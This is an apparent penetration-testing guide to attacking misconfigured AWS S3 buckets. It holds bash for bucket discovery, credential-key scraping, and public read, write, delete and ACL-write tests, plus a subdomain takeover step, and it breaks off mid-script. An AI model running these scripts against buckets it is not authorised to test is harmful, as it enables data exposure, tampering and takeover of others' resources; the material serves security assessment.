---
title: S3 Misconfigurations
description: Comprehensive guide for AWS S3 Bucket Reconnaissance, Enumeration, Exploitation, Data Exfiltration, Privilege Escalation, Persistence, and Defense Evasion techniques targeting misconfigured S3 buckets.
navigation:
  icon: i-lucide-database
---

## Overview

Amazon S3 (Simple Storage Service) is the **most commonly misconfigured AWS service**. S3 buckets store everything from static websites to database backups, secrets, source code, PII, and financial records. A single misconfigured bucket can lead to **complete data breaches**, **account takeover**, and **regulatory violations**.

::card-group

  :::card
  ---
  icon: i-lucide-search
  title: Reconnaissance
  to: "#reconnaissance"
  ---
  Discover S3 buckets via DNS, certificates, web scraping, brute-forcing, and OSINT techniques.
  :::

  :::card
  ---
  icon: i-lucide-list
  title: Enumeration
  to: "#enumeration"
  ---
  Extract bucket policies, ACLs, objects, versions, encryption settings, logging, and replication configs.
  :::

  :::card
  ---
  icon: i-lucide-swords
  title: Exploitation
  to: "#exploitation"
  ---
  Public read/write abuse, policy manipulation, ACL exploitation, presigned URL attacks, and object injection.
  :::

  :::card
  ---
  icon: i-lucide-arrow-up-circle
  title: Privilege Escalation
  to: "#privilege-escalation"
  ---
  Escalate from S3 access to IAM admin via policy files, credentials in objects, and Lambda trigger abuse.
  :::

  :::card
  ---
  icon: i-lucide-ghost
  title: Persistence & Evasion
  to: "#persistence--evasion"
  ---
  Backdoor via bucket policies, event notifications, replication, object versioning, and CloudTrail blind spots.
  :::

  :::card
  ---
  icon: i-lucide-download
  title: Data Exfiltration
  to: "#data-exfiltration"
  ---
  Mass download, selective extraction, snapshot sharing, cross-account replication, and covert exfil channels.
  :::

::

---

## S3 Architecture & Attack Surface

::note
Understanding S3's access control model is **essential** before attacking. S3 has **multiple overlapping access control mechanisms** that interact in complex ways.
::

### Access Control Layers

```
┌──────────────────────────────────────────────────────────────┐
│                        S3 REQUEST                            │
└──────────────────────┬───────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Layer 1: BLOCK PUBLIC ACCESS (Account/Bucket Level)         │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ BlockPublicAcls    │ Rejects PUT if ACL grants public  │  │
│  │ IgnorePublicAcls   │ Ignores public ACLs               │  │
│  │ BlockPublicPolicy  │ Rejects policy if grants public   │  │
│  │ RestrictPublicBuckets │ Limits public bucket access     │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────┬───────────────────────────────────────┘
                       │ (if not blocked)
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Layer 2: BUCKET POLICY (Resource-Based)                     │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ JSON policy attached to bucket                         │  │
│  │ Can Allow/Deny specific principals, actions, resources │  │
│  │ Can grant cross-account access                         │  │
│  │ Can be misconfigured with Principal: "*"               │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────┬───────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Layer 3: ACLs (Legacy — Still Dangerous)                    │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ Bucket ACL: Controls bucket-level access               │  │
│  │ Object ACL: Controls per-object access                 │  │
│  │ Grantees: Owner, AuthenticatedUsers, AllUsers          │  │
│  │ Permissions: READ, WRITE, READ_ACP, WRITE_ACP, FULL   │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────┬───────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Layer 4: IAM POLICIES (Identity-Based)                      │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ Attached to users, groups, roles                       │  │
│  │ Controls what S3 actions the identity can perform      │  │
│  │ Combined with bucket policy (union for same account)   │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────┬───────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────┐
│  Layer 5: S3 ACCESS POINTS / VPC ENDPOINTS                   │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ Named network endpoints with own access policies       │  │
│  │ Can restrict to VPC, specific IPs, or conditions       │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

### Misconfiguration Risk Matrix

| Misconfiguration | Risk Level | Impact |
|-----------------|------------|--------|
| Public READ on bucket | :badge[Critical]{color="red"} | Full data exposure |
| Public WRITE on bucket | :badge[Critical]{color="red"} | Data tampering, malware hosting, defacement |
| Public LIST on bucket | :badge[High]{color="orange"} | Object enumeration, targeted data theft |
| ACL grants `AllUsers` READ | :badge[Critical]{color="red"} | Anyone can read all objects |
| ACL grants `AuthenticatedUsers` | :badge[High]{color="orange"} | Any AWS account can access |
| Bucket policy with `Principal: *` | :badge[Critical]{color="red"} | Unrestricted access |
| Missing encryption | :badge[Medium]{color="yellow"} | Data at rest not encrypted |
| Versioning disabled | :badge[Medium]{color="yellow"} | No recovery from deletions |
| Logging disabled | :badge[Medium]{color="yellow"} | No audit trail |
| Cross-account access overly broad | :badge[High]{color="orange"} | Unintended third-party access |
| Object-level ACL overrides | :badge[High]{color="orange"} | Individual objects public despite bucket settings |
| Static website hosting enabled | :badge[Medium]{color="yellow"} | Content served publicly, potential XSS |
| Block Public Access disabled | :badge[High]{color="orange"} | No safety net against public exposure |
| Presigned URLs with long expiry | :badge[Medium]{color="yellow"} | Persistent unauthorized access |

---

## Methodology

::steps{level="3"}

### Phase 1 — Bucket Discovery

Identify target S3 buckets through DNS enumeration, certificate transparency, web scraping, brute-forcing bucket names, and OSINT.

### Phase 2 — Access Testing

Test each discovered bucket for public read, write, list, and ACL access. Check both authenticated and unauthenticated access.

### Phase 3 — Policy & ACL Analysis

Retrieve and analyze bucket policies, ACLs, Block Public Access settings, CORS configurations, and access points.

### Phase 4 — Object Enumeration & Sensitive Data Discovery

List and categorize objects. Identify sensitive files: backups, credentials, PII, source code, configuration files.

### Phase 5 — Exploitation

Exploit misconfigurations: read sensitive data, write malicious content, modify policies, abuse presigned URLs, inject objects.

### Phase 6 — Privilege Escalation

Leverage S3 access to escalate privileges: find IAM credentials in objects, modify CloudFormation templates, poison Lambda layers.

### Phase 7 — Persistence & Exfiltration

Establish persistence via bucket policies, replication rules, event notifications. Exfiltrate data through various channels.

::

---

## Reconnaissance

### Bucket Discovery Techniques

::tip
S3 bucket names are **globally unique**. If you can guess or discover a bucket name, you can immediately test it for misconfigurations — no authentication needed.
::

#### DNS & Subdomain Enumeration

```bash [DNS-Based Discovery]
# ============================================
# S3 bucket DNS patterns
# ============================================

# Virtual-hosted style (modern)
# https://BUCKET-NAME.s3.amazonaws.com
# https://BUCKET-NAME.s3.REGION.amazonaws.com

# Path style (legacy)
# https://s3.amazonaws.com/BUCKET-NAME
# https://s3.REGION.amazonaws.com/BUCKET-NAME

# Website endpoint
# http://BUCKET-NAME.s3-website-REGION.amazonaws.com
# http://BUCKET-NAME.s3-website.REGION.amazonaws.com

# ============================================
# DNS enumeration
# ============================================

# Check if a bucket exists via DNS
host target-company.s3.amazonaws.com
dig target-company.s3.amazonaws.com
nslookup target-company.s3.amazonaws.com

# CNAME records pointing to S3
dig +short CNAME assets.target.com
dig +short CNAME static.target.com
dig +short CNAME media.target.com
dig +short CNAME cdn.target.com
dig +short CNAME backup.target.com

# Enumerate subdomains that might be S3 buckets
# Using subfinder
subfinder -d target.com -silent | while read sub; do
  cname=$(dig +short CNAME $sub 2>/dev/null)
  if echo "$cname" | grep -qi "s3\|amazonaws"; then
    echo "[S3] $sub -> $cname"
  fi
done

# Using amass
amass enum -passive -d target.com | while read sub; do
  cname=$(dig +short CNAME $sub 2>/dev/null)
  if echo "$cname" | grep -qi "s3\|amazonaws"; then
    echo "[S3] $sub -> $cname"
  fi
done

# Check for S3 takeover (CNAME pointing to deleted bucket)
dig +short CNAME assets.target.com
# If returns: assets.target.com.s3.amazonaws.com
# And bucket doesn't exist → SUBDOMAIN TAKEOVER!
curl -s http://assets.target.com
# If returns: NoSuchBucket → Create it and take over the subdomain!
```

#### Web Scraping & JavaScript Analysis

```bash [Web Content Analysis]
# ============================================
# Scrape target website for S3 references
# ============================================

# Find S3 URLs in page source
curl -s https://target.com | grep -oP 'https?://[a-zA-Z0-9.-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com[^\s"<>]*'
curl -s https://target.com | grep -oP 'https?://s3[a-zA-Z0-9.-]*\.amazonaws\.com/[a-zA-Z0-9._/-]+[^\s"<>]*'

# Deep scan all pages
wget -q -r -l 2 -nd -A html,js,css,json https://target.com -P /tmp/target-site/
grep -rhoP 'https?://[a-zA-Z0-9.-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com[^\s"<>]*' /tmp/target-site/ | sort -u

# JavaScript file analysis
curl -s https://target.com | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
  # Handle relative URLs
  [[ "$js" != http* ]] && js="https://target.com$js"
  echo "[*] Scanning: $js"
  curl -s "$js" | grep -oP '[a-zA-Z0-9._-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com' | sort -u
  curl -s "$js" | grep -oP 'arn:aws:s3:::[a-zA-Z0-9._-]+' | sort -u
  curl -s "$js" | grep -oP 'AKIA[0-9A-Z]{16}' | sort -u
done

# Search for presigned URLs
curl -s https://target.com | grep -oP 'https?://[^"<>\s]*X-Amz-Signature[^"<>\s]*'

# Search for CloudFront distributions (often front S3)
curl -s https://target.com | grep -oP '[a-z0-9]+\.cloudfront\.net'
dig +short CNAME cdn.target.com | grep cloudfront

# Wayback Machine — find historical S3 references
curl -s "https://web.archive.org/cdx/search/cdx?url=*.s3.amazonaws.com&matchType=domain&output=json&fl=original&collapse=urlkey" | jq -r '.[1:][][0]' | sort -u

curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&fl=original&collapse=urlkey" | jq -r '.[1:][][0]' | grep -i "s3\|amazonaws" | sort -u
```

#### Brute-Force Bucket Names

```bash [Bucket Name Brute-Force]
# ============================================
# Common bucket naming conventions
# ============================================
# {company}-{env}        → target-prod, target-dev, target-staging
# {company}-{service}    → target-assets, target-backups, target-logs
# {company}-{env}-{service} → target-prod-db-backups
# {company}.{tld}        → target.com (bucket named after domain)
# {project}-{env}        → myapp-production
# {company}-{region}     → target-us-east-1

# Generate wordlist based on target
cat > /tmp/s3-prefixes.txt << 'EOF'
target
target-com
targetcompany
target-company
target.com
www.target.com
EOF

cat > /tmp/s3-suffixes.txt << 'EOF'
-assets
-static
-media
-images
-uploads
-files
-content
-data
-backup
-backups
-db-backup
-database-backup
-logs
-log
-dev
-development
-staging
-stage
-stg
-prod
-production
-test
-testing
-qa
-uat
-demo
-internal
-private
-public
-web
-website
-www
-api
-app
-application
-config
-configuration
-deploy
-deployment
-releases
-artifacts
-build
-ci
-cd
-terraform
-cloudformation
-infra
-infrastructure
-secrets
-credentials
-keys
-certs
-certificates
-ssl
-docs
-documentation
-reports
-analytics
-temp
-tmp
-archive
-old
-legacy
-v1
-v2
-us-east-1
-us-west-2
-eu-west-1
-ap-southeast-1
EOF

# Generate combinations
while read prefix; do
  echo "$prefix"
  while read suffix; do
    echo "${prefix}${suffix}"
  done < /tmp/s3-suffixes.txt
done < /tmp/s3-prefixes.txt > /tmp/s3-wordlist.txt

echo "[+] Generated $(wc -l < /tmp/s3-wordlist.txt) bucket names to check"
```

### Bucket Discovery Tools

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="S3Scanner"}
  ```bash [S3Scanner]
  # Install
  pip3 install s3scanner

  # Scan from wordlist
  s3scanner scan --buckets-file /tmp/s3-wordlist.txt

  # Scan with dump (download public files)
  s3scanner scan --buckets-file /tmp/s3-wordlist.txt --dump

  # Scan single bucket
  s3scanner scan --bucket target-company-backups

  # Output format
  s3scanner scan --buckets-file /tmp/s3-wordlist.txt --json --out results.json
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="cloud_enum"}
  ```bash [cloud_enum — Multi-Cloud]
  # Install
  pip3 install cloud_enum

  # Enumerate cloud resources for a keyword
  cloud_enum -k target-company -t 50

  # With mutations
  cloud_enum -k target-company -m /tmp/s3-suffixes.txt -t 50

  # cloud_enum checks:
  # ✓ AWS S3 buckets
  # ✓ Azure blob storage
  # ✓ GCP buckets
  # ✓ DigitalOcean Spaces
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="GrayhatWarfare"}
  ```bash [GrayhatWarfare — Open Bucket Search]
  # Search engine for open S3 buckets
  # https://buckets.grayhatwarfare.com/

  # API usage (requires free account)
  curl -s "https://buckets.grayhatwarfare.com/api/v2/files?keywords=target-company&extensions=sql,env,pem,key" \
    -H "Authorization: Bearer YOUR_API_KEY" | jq .

  # Search for specific file types
  curl -s "https://buckets.grayhatwarfare.com/api/v2/files?keywords=target-company&extensions=bak,sql,dump,tar.gz,zip" \
    -H "Authorization: Bearer YOUR_API_KEY" | jq .

  # Search by bucket name
  curl -s "https://buckets.grayhatwarfare.com/api/v2/buckets?keyword=target" \
    -H "Authorization: Bearer YOUR_API_KEY" | jq .
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="AWSBucketDump"}
  ```bash [AWSBucketDump]
  # Install
  cd /opt
  git clone https://github.com/jordanpotti/AWSBucketDump.git
  cd AWSBucketDump
  pip3 install -r requirements.txt

  # Scan for interesting files in discovered buckets
  python3 AWSBucketDump.py -l /tmp/s3-wordlist.txt -g interesting_Keywords.txt -D -d /tmp/s3-loot/

  # interesting_Keywords.txt contains:
  # password
  # secret
  # credentials
  # key
  # token
  # backup
  # database
  # .env
  # config
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bucket Finder"}
  ```bash [bucket_finder]
  # Install
  cd /opt
  git clone https://github.com/dionach/bucket_finder.git

  # Quick check
  ruby /opt/bucket_finder/bucket_finder.rb /tmp/s3-wordlist.txt

  # With region specification
  ruby /opt/bucket_finder/bucket_finder.rb /tmp/s3-wordlist.txt --region us-east-1

  # Download accessible files
  ruby /opt/bucket_finder/bucket_finder.rb /tmp/s3-wordlist.txt --download
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Custom Scanner"}
  ```bash [Custom Fast Scanner]
  #!/bin/bash
  # fast_s3_scan.sh — High-speed S3 bucket checker
  # Usage: ./fast_s3_scan.sh wordlist.txt [threads]
  
  WORDLIST=$1
  THREADS=${2:-50}
  OUTPUT="s3-scan-$(date +%Y%m%d-%H%M%S).txt"
  
  echo "[*] Scanning $(wc -l < $WORDLIST) bucket names with $THREADS threads..."
  
  check_bucket() {
    bucket=$1
    
    # Check if bucket exists
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/" 2>/dev/null)
    
    case $status in
      200)
        echo "[PUBLIC-LIST] $bucket" | tee -a "$OUTPUT"
        ;;
      403)
        # Exists but no list permission — check further
        # Try to read a common file
        read_status=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/index.html" 2>/dev/null)
        if [ "$read_status" == "200" ]; then
          echo "[PUBLIC-READ] $bucket" | tee -a "$OUTPUT"
        else
          echo "[EXISTS-PRIVATE] $bucket" | tee -a "$OUTPUT"
        fi
        ;;
      404)
        # Bucket doesn't exist — potential takeover if CNAME exists
        ;;
      301)
        echo "[REDIRECT] $bucket" | tee -a "$OUTPUT"
        ;;
    esac
  }
  
  export -f check_bucket
  export OUTPUT
  
  cat "$WORDLIST" | xargs -P $THREADS -I {} bash -c 'check_bucket "$@"' _ {}
  
  echo ""
  echo "[+] Results saved to: $OUTPUT"
  echo "[+] Public buckets found: $(grep -c 'PUBLIC' $OUTPUT)"
  echo "[+] Existing private buckets: $(grep -c 'EXISTS' $OUTPUT)"
  ```
  :::
::

### Certificate Transparency & OSINT

```bash [CT Logs & OSINT]
# ============================================
# Certificate Transparency Logs
# ============================================

# Search crt.sh for S3 references
curl -s "https://crt.sh/?q=%.s3.amazonaws.com&output=json" | \
  jq -r '.[].name_value' | sort -u | head -50

# Search for target's S3 buckets via CT
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u | while read domain; do
    cname=$(dig +short CNAME $domain 2>/dev/null)
    echo "$cname" | grep -qi "s3" && echo "[S3-CNAME] $domain -> $cname"
  done

# ============================================
# Shodan
# ============================================

# Search Shodan for S3-related findings
shodan search "s3.amazonaws.com target-company" --fields ip_str,hostnames
shodan search "ssl.cert.subject.CN:target.com s3"

# ============================================
# Google Dorking
# ============================================

# Google dorks for S3 buckets
# site:s3.amazonaws.com "target-company"
# site:s3.amazonaws.com "target.com"
# inurl:s3.amazonaws.com "target"
# "target-company" filetype:sql site:s3.amazonaws.com
# "target-company" filetype:env site:s3.amazonaws.com
# "target-company" filetype:pem site:s3.amazonaws.com
# "target-company.s3.amazonaws.com"
# intitle:"Index of" site:s3.amazonaws.com "target"

# ============================================
# GitHub/GitLab Search
# ============================================

# Search for S3 bucket references in code
# GitHub: "target-company" "s3://" OR "s3.amazonaws.com"
# GitHub: org:target-company "s3://"
# GitHub: "target-company-" "aws_s3_bucket"
# GitHub: "target-company" ".s3.amazonaws.com" filename:.env
# GitHub: "target-company" "aws_access_key" "aws_secret"

# Using trufflehog
trufflehog github --org=target-company --only-verified 2>/dev/null | \
  grep -i "s3\|bucket"

# Using gitleaks
gitleaks detect --source=/path/to/cloned/repo --report-path=gitleaks-report.json
cat gitleaks-report.json | jq '.[] | select(.Description | test("AWS|S3|bucket"; "i"))'
```

---

## Enumeration

### Unauthenticated Enumeration

::warning
These checks can be performed **without any AWS credentials**. They test what the **entire internet** can access.
::

::steps{level="4"}

#### Step 1 — Test Public Listing

```bash [Public List Check]
# ============================================
# Check if bucket contents are publicly listable
# ============================================

BUCKET="target-company-assets"

# Method 1: AWS CLI (no credentials)
aws s3 ls s3://$BUCKET --no-sign-request

# Method 2: curl
curl -s "https://${BUCKET}.s3.amazonaws.com/" | xmllint --format -

# Method 3: curl with region
curl -s "https://${BUCKET}.s3.us-east-1.amazonaws.com/" | xmllint --format -

# Method 4: Path style
curl -s "https://s3.amazonaws.com/${BUCKET}/" | xmllint --format -

# Parse XML listing
curl -s "https://${BUCKET}.s3.amazonaws.com/" | \
  grep -oP '<Key>[^<]+</Key>' | sed 's/<[^>]*>//g'

# Handle pagination (S3 returns max 1000 objects per request)
list_all_objects() {
  local bucket=$1
  local marker=""
  local count=0
  
  while true; do
    if [ -z "$marker" ]; then
      response=$(curl -s "https://${bucket}.s3.amazonaws.com/")
    else
      response=$(curl -s "https://${bucket}.s3.amazonaws.com/?marker=${marker}")
    fi
    
    # Extract keys
    echo "$response" | grep -oP '<Key>[^<]+</Key>' | sed 's/<[^>]*>//g'
    
    # Count
    batch=$(echo "$response" | grep -c '<Key>')
    count=$((count + batch))
    
    # Check if truncated
    truncated=$(echo "$response" | grep -oP '<IsTruncated>[^<]+</IsTruncated>' | sed 's/<[^>]*>//g')
    if [ "$truncated" != "true" ]; then
      break
    fi
    
    # Get next marker
    marker=$(echo "$response" | grep -oP '<Key>[^<]+</Key>' | tail -1 | sed 's/<[^>]*>//g')
    marker=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$marker'))")
  done
  
  echo "[+] Total objects: $count" >&2
}

list_all_objects "$BUCKET" > /tmp/bucket-listing.txt
```

#### Step 2 — Test Public Read

```bash [Public Read Check]
# ============================================
# Check if individual objects are publicly readable
# ============================================

BUCKET="target-company-assets"

# Try common sensitive filenames
SENSITIVE_FILES=(
  "index.html"
  ".env"
  ".git/config"
  ".git/HEAD"
  "config.yml"
  "config.yaml"
  "config.json"
  "database.yml"
  "credentials"
  "credentials.json"
  "secrets.json"
  "secrets.yml"
  "backup.sql"
  "dump.sql"
  "db.sql"
  "database.sql"
  "users.sql"
  "backup.tar.gz"
  "backup.zip"
  "id_rsa"
  "id_rsa.pub"
  "server.key"
  "server.pem"
  "private.key"
  "cert.pem"
  "terraform.tfstate"
  "terraform.tfstate.backup"
  ".terraform/terraform.tfstate"
  "template.yaml"
  "serverless.yml"
  "docker-compose.yml"
  "Dockerfile"
  ".dockerenv"
  "wp-config.php"
  "application.properties"
  "appsettings.json"
  "web.config"
  ".htpasswd"
  ".htaccess"
  "sitemap.xml"
  "robots.txt"
  "crossdomain.xml"
  "phpinfo.php"
  "debug.log"
  "error.log"
  "access.log"
  "swagger.json"
  "openapi.json"
  "api-docs.json"
)

echo "[*] Testing public read access on: $BUCKET"
for file in "${SENSITIVE_FILES[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://${BUCKET}.s3.amazonaws.com/${file}" 2>/dev/null)
  
  if [ "$status" == "200" ]; then
    size=$(curl -sI "https://${BUCKET}.s3.amazonaws.com/${file}" | \
      grep -i content-length | awk '{print $2}' | tr -d '\r')
    echo "[FOUND] $file (${size} bytes)"
  fi
done
```

#### Step 3 — Test Public Write

```bash [Public Write Check]
# ============================================
# Check if bucket allows public writes
# ============================================

BUCKET="target-company-assets"

# Test write access (upload a harmless test file)
echo "pentest-write-test-$(date +%s)" > /tmp/write-test.txt

# Method 1: AWS CLI
aws s3 cp /tmp/write-test.txt s3://$BUCKET/pentest-write-test.txt --no-sign-request 2>&1

# Method 2: curl PUT
curl -X PUT \
  -d "pentest-write-test" \
  "https://${BUCKET}.s3.amazonaws.com/pentest-write-test.txt"

# Method 3: Check response
STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
  -d "test" \
  "https://${BUCKET}.s3.amazonaws.com/pentest-write-test-$(date +%s).txt")

case $STATUS in
  200) echo "[!!!] BUCKET IS PUBLICLY WRITABLE!" ;;
  403) echo "[OK] Write access denied" ;;
  *) echo "[?] Unexpected status: $STATUS" ;;
esac

# Test DELETE access
curl -s -o /dev/null -w "%{http_code}" -X DELETE \
  "https://${BUCKET}.s3.amazonaws.com/pentest-write-test.txt"

# ALWAYS clean up test files!
aws s3 rm s3://$BUCKET/pentest-write-test.txt --no-sign-request 2>/dev/null
```

#### Step 4 — Test Public ACL Access

```bash [Public ACL Check]
# ============================================
# Check if ACL is publicly readable/writable
# ============================================

BUCKET="target-company-assets"

# Read bucket ACL
curl -s "https://${BUCKET}.s3.amazonaws.com/?acl" | xmllint --format -

# AWS CLI
aws s3api get-bucket-acl --bucket $BUCKET --no-sign-request 2>&1

# Check for dangerous ACL grants:
# - AllUsers (http://acs.amazonaws.com/groups/global/AllUsers) = Public
# - AuthenticatedUsers (http://acs.amazonaws.com/groups/global/AuthenticatedUsers) = Any AWS account

# Read object ACL
curl -s "https://${BUCKET}.s3.amazonaws.com/somefile.txt?acl" | xmllint --format -

# Check if you can WRITE the ACL (change permissions)
# This is extremely dangerous if possible
curl -s -o /dev/null -w "%{http_code}" -X PUT \
  "https://${BUCKET}.s3.amazonaws.com/?acl" \
  -H "x-amz-acl: public-read-write"
# If 200 → You can change the bucket ACL!
```

::

### Authenticated Enumeration

```bash [Authenticated S3 Enumeration]
#!/bin/bash
# s3_full_enum.sh — Complete S3 enumeration with credentials

PROFILE=${1:-default}
OUTDIR="./s3-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTDIR"

echo "[*] S3 Full Enumeration — Profile: $PROFILE"

# ============================================
# List all buckets
# ============================================
echo "[*] Listing all buckets..."
aws s3api list-buckets --profile $PROFILE > "$OUTDIR/all-buckets.json"
BUCKETS=$(jq -r '.Buckets[].Name' "$OUTDIR/all-buckets.json")
BUCKET_COUNT=$(echo "$BUCKETS" | wc -l)
echo "[+] Found $BUCKET_COUNT buckets"

for bucket in $BUCKETS; do
  echo ""
  echo "================================================================"
  echo "[*] Bucket: $bucket"
  echo "================================================================"
  
  mkdir -p "$OUTDIR/$bucket"
  
  # ============================================
  # Bucket location (region)
  # ============================================
  REGION=$(aws s3api get-bucket-location --bucket $bucket --profile $PROFILE \
    --query 'LocationConstraint' --output text 2>/dev/null)
  [ "$REGION" == "None" ] && REGION="us-east-1"
  echo "  Region: $REGION"
  
  # ============================================
  # Block Public Access settings
  # ============================================
  echo "  [*] Checking Block Public Access..."
  BPA=$(aws s3api get-public-access-block --bucket $bucket --profile $PROFILE 2>/dev/null)
  if [ ! -z "$BPA" ]; then
    echo "$BPA" > "$OUTDIR/$bucket/block-public-access.json"
    
    BLOCK_ACL=$(echo "$BPA" | jq -r '.PublicAccessBlockConfiguration.BlockPublicAcls')
    IGNORE_ACL=$(echo "$BPA" | jq -r '.PublicAccessBlockConfiguration.IgnorePublicAcls')
    BLOCK_POLICY=$(echo "$BPA" | jq -r '.PublicAccessBlockConfiguration.BlockPublicPolicy')
    RESTRICT=$(echo "$BPA" | jq -r '.PublicAccessBlockConfiguration.RestrictPublicBuckets')
    
    if [ "$BLOCK_ACL" != "true" ] || [ "$IGNORE_ACL" != "true" ] || \
       [ "$BLOCK_POLICY" != "true" ] || [ "$RESTRICT" != "true" ]; then
      echo "  [!!!] BLOCK PUBLIC ACCESS NOT FULLY ENABLED!"
      echo "    BlockPublicAcls: $BLOCK_ACL"
      echo "    IgnorePublicAcls: $IGNORE_ACL"
      echo "    BlockPublicPolicy: $BLOCK_POLICY"
      echo "    RestrictPublicBuckets: $RESTRICT"
    else
      echo "  [OK] Block Public Access fully enabled"
    fi
  else
    echo "  [!!!] NO BLOCK PUBLIC ACCESS CONFIGURATION!"
  fi
  
  # ============================================
  # Bucket Policy
  # ============================================
  echo "  [*] Checking bucket policy..."
  POLICY=$(aws s3api get-bucket-policy --bucket $bucket --profile $PROFILE \
    --query 'Policy' --output text 2>/dev/null)
  
  if [ ! -z "$POLICY" ] && [ "$POLICY" != "None" ]; then
    echo "$POLICY" | jq . > "$OUTDIR/$bucket/bucket-policy.json" 2>/dev/null
    
    # Check for public access in policy
    PUBLIC_PRINCIPAL=$(echo "$POLICY" | jq -r '.Statement[] | select(.Principal == "*" or .Principal.AWS == "*") | .Sid // "unnamed"')
    if [ ! -z "$PUBLIC_PRINCIPAL" ]; then
      echo "  [!!!] POLICY GRANTS PUBLIC ACCESS: $PUBLIC_PRINCIPAL"
    fi
    
    # Check for overly broad cross-account
    CROSS_ACCOUNT=$(echo "$POLICY" | jq -r '.Statement[].Principal.AWS // .Statement[].Principal | select(. != null)' 2>/dev/null | grep -v "$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)")
    if [ ! -z "$CROSS_ACCOUNT" ]; then
      echo "  [!] Cross-account access: $CROSS_ACCOUNT"
    fi
    
    # Check for dangerous actions
    DANGEROUS_ACTIONS=$(echo "$POLICY" | jq -r '.Statement[] | select(.Effect == "Allow") | .Action' 2>/dev/null | grep -iE '"s3:\*"|"s3:Put"|"s3:Delete"|"\*"')
    if [ ! -z "$DANGEROUS_ACTIONS" ]; then
      echo "  [!!!] DANGEROUS ACTIONS IN POLICY: $DANGEROUS_ACTIONS"
    fi
  else
    echo "  [OK] No bucket policy"
  fi
  
  # ============================================
  # Bucket ACL
  # ============================================
  echo "  [*] Checking bucket ACL..."
  aws s3api get-bucket-acl --bucket $bucket --profile $PROFILE \
    > "$OUTDIR/$bucket/bucket-acl.json" 2>/dev/null
  
  # Check for public ACL grants
  PUBLIC_ACL=$(jq -r '.Grants[] | select(.Grantee.URI != null) | "\(.Grantee.URI) : \(.Permission)"' \
    "$OUTDIR/$bucket/bucket-acl.json" 2>/dev/null)
  if [ ! -z "$PUBLIC_ACL" ]; then
    echo "  [!] ACL Grants:"
    echo "$PUBLIC_ACL" | while read grant; do
      echo "    $grant"
      echo "$grant" | grep -qi "AllUsers" && echo "    [!!!] PUBLIC ACCESS VIA ACL!"
      echo "$grant" | grep -qi "AuthenticatedUsers" && echo "    [!!!] ANY AWS ACCOUNT ACCESS VIA ACL!"
    done
  fi
  
  # ============================================
  # Encryption
  # ============================================
  echo "  [*] Checking encryption..."
  ENCRYPTION=$(aws s3api get-bucket-encryption --bucket $bucket --profile $PROFILE 2>/dev/null)
  if [ ! -z "$ENCRYPTION" ]; then
    echo "$ENCRYPTION" > "$OUTDIR/$bucket/encryption.json"
    ENC_TYPE=$(echo "$ENCRYPTION" | jq -r '.ServerSideEncryptionConfiguration.Rules[0].ApplyServerSideEncryptionByDefault.SSEAlgorithm')
    echo "  Encryption: $ENC_TYPE"
  else
    echo "  [!] NO DEFAULT ENCRYPTION!"
  fi
  
  # ============================================
  # Versioning
  # ============================================
  echo "  [*] Checking versioning..."
  VERSIONING=$(aws s3api get-bucket-versioning --bucket $bucket --profile $PROFILE \
    --query 'Status' --output text 2>/dev/null)
  echo "  Versioning: ${VERSIONING:-Disabled}"
  [ "$VERSIONING" != "Enabled" ] && echo "  [!] Versioning not enabled"
  
  # ============================================
  # Logging
  # ============================================
  echo "  [*] Checking logging..."
  LOGGING=$(aws s3api get-bucket-logging --bucket $bucket --profile $PROFILE 2>/dev/null)
  LOG_BUCKET=$(echo "$LOGGING" | jq -r '.LoggingEnabled.TargetBucket // "disabled"')
  echo "  Logging: $LOG_BUCKET"
  [ "$LOG_BUCKET" == "disabled" ] && echo "  [!] Server access logging not enabled"
  
  # ============================================
  # CORS Configuration
  # ============================================
  echo "  [*] Checking CORS..."
  CORS=$(aws s3api get-bucket-cors --bucket $bucket --profile $PROFILE 2>/dev/null)
  if [ ! -z "$CORS" ]; then
    echo "$CORS" > "$OUTDIR/$bucket/cors.json"
    WILDCARD_CORS=$(echo "$CORS" | jq -r '.CORSRules[].AllowedOrigins[]' | grep "\*")
    if [ ! -z "$WILDCARD_CORS" ]; then
      echo "  [!] WILDCARD CORS ORIGIN: *"
    fi
  fi
  
  # ============================================
  # Website Configuration
  # ============================================
  echo "  [*] Checking static website hosting..."
  WEBSITE=$(aws s3api get-bucket-website --bucket $bucket --profile $PROFILE 2>/dev/null)
  if [ ! -z "$WEBSITE" ]; then
    echo "$WEBSITE" > "$OUTDIR/$bucket/website.json"
    echo "  [!] Static website hosting ENABLED"
